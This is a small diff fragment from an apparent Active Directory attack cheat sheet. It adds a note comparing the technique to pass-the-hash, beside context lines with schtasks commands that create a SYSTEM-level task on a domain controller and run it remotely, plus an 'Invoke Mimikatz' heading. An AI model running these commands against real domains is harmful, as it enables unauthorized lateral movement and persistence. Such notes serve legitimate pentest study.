@@ -282,7 +282,7 @@ schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "U
 ```
 schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
 ```
-
+Note: Similar to PTH for applicable kerberos systems 
 
 # Invoke Mimikatz
 
